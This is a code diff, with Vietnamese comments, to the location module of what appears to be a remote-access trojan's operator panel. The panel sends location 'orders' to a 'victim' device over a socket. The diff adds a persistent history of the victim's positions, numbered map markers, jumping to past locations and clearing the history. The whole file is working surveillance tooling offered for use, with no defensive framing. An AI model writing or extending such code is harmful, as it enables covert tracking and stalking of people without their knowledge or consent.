@@ -1577,11 +1577,34 @@ app.controller("LocCtrl", function ($scope, $rootScope) {
     $LocCtrl = $scope;
     var location = CONSTANTS.orders.location;
 
+    // Lấy victimId từ main process
+    const { ipcRenderer } = require('electron');
+    let victimId = null;
+
+    // Gửi request để lấy victimId
+    ipcRenderer.send('getCurrentVictimId');
+
+    // Lắng nghe response
+    ipcRenderer.once('getCurrentVictimIdResponse', (event, response) => {
+        if (response.success) {
+            victimId = response.victimId;
+            // Load location history sau khi có victimId
+            $LocCtrl.loadLocationHistory();
+        } else {
+            console.error('Error getting victimId:', response.message);
+        }
+    });
+
+    // Khởi tạo biến cho location history
+    $LocCtrl.locationHistory = [];
+    $LocCtrl.selectedLocationIndex = -1;
+    var markers = []; // Array để lưu tất cả markers
+    var marker; // Marker cho vị trí hiện tại
+
     $LocCtrl.$on('$destroy', () => {
         // release resources, cancel Listner...
         socket.removeAllListeners(location);
     });
-
 
     var map = L.map('mapid', {
         zoomControl: true,
@@ -1595,22 +1618,156 @@ app.controller("LocCtrl", function ($scope, $rootScope) {
     }).setView([51.505, -0.09], 13);
     L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {}).addTo(map);
 
-    $LocCtrl.Refresh = () => {
+    // Load location history khi controller khởi tạo
+    $LocCtrl.loadLocationHistory = () => {
+        if (victimId) {
+            ipcRenderer.send('getLocationHistory', victimId);
+        } else {
+            console.error('VictimId not available');
+        }
+    };
 
+    // Lắng nghe response từ main process
+    ipcRenderer.on('getLocationHistoryResponse', (event, response) => {
+        if (response.success) {
+            $LocCtrl.locationHistory = response.history;
+            $LocCtrl.$apply();
+            // Hiển thị tất cả markers sau khi load history
+            $LocCtrl.displayAllMarkers();
+        } else {
+            $rootScope.Log('Error loading location history: ' + response.message, CONSTANTS.logStatus.FAIL);
+        }
+    });
+
+    // Lắng nghe location update từ server
+    ipcRenderer.on('SocketIO:LocationUpdated', (event, data) => {
+        if (data.deviceId === victimId) {
+            $LocCtrl.locationHistory = data.history;
+            $LocCtrl.$apply();
+            // Hiển thị tất cả markers sau khi update
+            $LocCtrl.displayAllMarkers();
+        }
+    });
+
+    // Hiển thị tất cả markers trên bản đồ
+    $LocCtrl.displayAllMarkers = () => {
+        // Xóa tất cả markers cũ
+        if (markers) {
+            markers.forEach(marker => map.removeLayer(marker));
+            markers = [];
+        }
+
+        // Tạo markers cho tất cả vị trí trong history
+        if ($LocCtrl.locationHistory && $LocCtrl.locationHistory.length > 0) {
+            $LocCtrl.locationHistory.forEach((location, index) => {
+                if (location.lat && location.lng) {
+                    // Bỏ qua vị trí đang được focus (sẽ được hiển thị riêng)
+                    if ($LocCtrl.focusedLocationIndex === index) {
+                        return;
+                    }
+
+                    var victimLoc = new L.LatLng(location.lat, location.lng);
+                    var markerNumber = $LocCtrl.locationHistory.length - index; // Số từ 10 đến 1
+
+                    var marker = L.marker(victimLoc, {
+                        icon: L.divIcon({
+                            className: 'custom-marker',
+                            html: '<div style="background: #007bff; color: white; border-radius: 50%; width: 25px; height: 25px; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 2px solid white; box-shadow: 0 2px 6px rgba(0,0,0,0.3); font-size: 11px;">' + markerNumber + '</div>',
+                            iconSize: [25, 25],
+                            iconAnchor: [12.5, 12.5]
+                        })
+                    }).addTo(map);
+
+                    // Thêm popup cho marker
+                    marker.bindPopup('<b>Location #' + (index + 1) + '</b><br>Lat: ' + location.lat.toFixed(6) + '<br>Lng: ' + location.lng.toFixed(6) + '<br>Time: ' + new Date(location.timestamp).toLocaleString());
+
+                    markers.push(marker);
+                }
+            });
+        }
+    };
+
+    // Xóa location history
+    $LocCtrl.clearLocationHistory = () => {
+        if (victimId && confirm('Are you sure you want to delete all location history?')) {
+            ipcRenderer.send('clearLocationHistory', victimId);
+        } else if (!victimId) {
+            console.error('VictimId not available');
+        }
+    };
+
+    // Lắng nghe response clear history
+    ipcRenderer.on('clearLocationHistoryResponse', (event, response) => {
+        if (response.success) {
+            $LocCtrl.locationHistory = [];
+            // Xóa tất cả markers
+            if (markers) {
+                markers.forEach(marker => map.removeLayer(marker));
+                markers = [];
+            }
+            // Reset focus state
+            if ($LocCtrl.focusedMarker) {
+                map.removeLayer($LocCtrl.focusedMarker);
+                $LocCtrl.focusedMarker = null;
+            }
+            $LocCtrl.focusedLocationIndex = null;
+            $LocCtrl.selectedLocationIndex = null;
+            $LocCtrl.$apply();
+            $rootScope.Log('Location history cleared', CONSTANTS.logStatus.SUCCESS);
+        } else {
+            $rootScope.Log('Error clearing location history: ' + response.message, CONSTANTS.logStatus.FAIL);
+        }
+    });
+
+    // Biến để theo dõi vị trí đang được focus
+    $LocCtrl.focusedLocationIndex = null;
+    $LocCtrl.focusedMarker = null;
+
+    // Đi đến vị trí cụ thể (luôn focus, không toggle-off)
+    $LocCtrl.goToLocation = (locationData, index) => {
+        if (locationData && locationData.lat && locationData.lng) {
+            var victimLoc = new L.LatLng(locationData.lat, locationData.lng);
+
+            // Xóa marker focus cũ nếu có
+            if ($LocCtrl.focusedMarker) {
+                map.removeLayer($LocCtrl.focusedMarker);
+                $LocCtrl.focusedMarker = null;
+            }
+
+            // Tạo marker mới cho vị trí được chọn
+            var markerNumber = $LocCtrl.locationHistory.length - index; // Số từ 10 đến 1
+            $LocCtrl.focusedMarker = L.marker(victimLoc, {
+                icon: L.divIcon({
+                    className: 'custom-marker selected',
+                    html: '<div style="background: #ff4444; color: white; border-radius: 50%; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 3px solid white; box-shadow: 0 2px 8px rgba(0,0,0,0.3);">' + markerNumber + '</div>',
+                    iconSize: [30, 30],
+                    iconAnchor: [15, 15]
+                })
+            }).addTo(map);
+
+            // Hiển thị tất cả markers trên bản đồ (trừ marker đang focus)
+            $LocCtrl.focusedLocationIndex = index;
+            $LocCtrl.selectedLocationIndex = index;
+            $LocCtrl.displayAllMarkers();
+
+            $LocCtrl.$apply();
+            map.panTo(victimLoc);
+            map.setZoom(15);
+
+            $rootScope.Log('Focused on location: ' + locationData.lat + ', ' + locationData.lng, CONSTANTS.logStatus.SUCCESS);
+        }
+    };
+
+    $LocCtrl.Refresh = () => {
         $LocCtrl.load = 'loading';
         $rootScope.Log('Get Location..');
         socket.emit(ORDER, { order: location });
-
     }
-
-
 
     $LocCtrl.load = 'loading';
     $rootScope.Log('Get Location..');
     socket.emit(ORDER, { order: location });
 
-
-    var marker;
     socket.on(location, (data) => {
         $LocCtrl.load = '';
         if (data.enable) {
@@ -1619,16 +1776,30 @@ app.controller("LocCtrl", function ($scope, $rootScope) {
             else {
                 $rootScope.Log('Location arrived => ' + data.lat + "," + data.lng, CONSTANTS.logStatus.SUCCESS);
                 var victimLoc = new L.LatLng(data.lat, data.lng);
-                if (!marker)
-                    var marker = L.marker(victimLoc).addTo(map);
-                else
-                    marker.setLatLng(victimLoc).update();
+
+                // Xóa marker cũ nếu có
+                if (marker) {
+                    map.removeLayer(marker);
+                }
+
+                // Tạo marker mới cho vị trí hiện tại
+                marker = L.marker(victimLoc, {
+                    icon: L.divIcon({
+                        className: 'custom-marker current',
+                        html: '<div style="background: #28a745; color: white; border-radius: 50%; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 3px solid white; box-shadow: 0 2px 8px rgba(0,0,0,0.3);">📍</div>',
+                        iconSize: [30, 30],
+                        iconAnchor: [15, 15]
+                    })
+                }).addTo(map);
 
                 map.panTo(victimLoc);
+
+                // Reload location history sau khi có vị trí mới
+                if (victimId) {
+                    $LocCtrl.loadLocationHistory();
+                }
             }
         } else
             $rootScope.Log('Location Service is not enabled on Victim\'s Device', CONSTANTS.logStatus.FAIL);
-
     });
-
 });
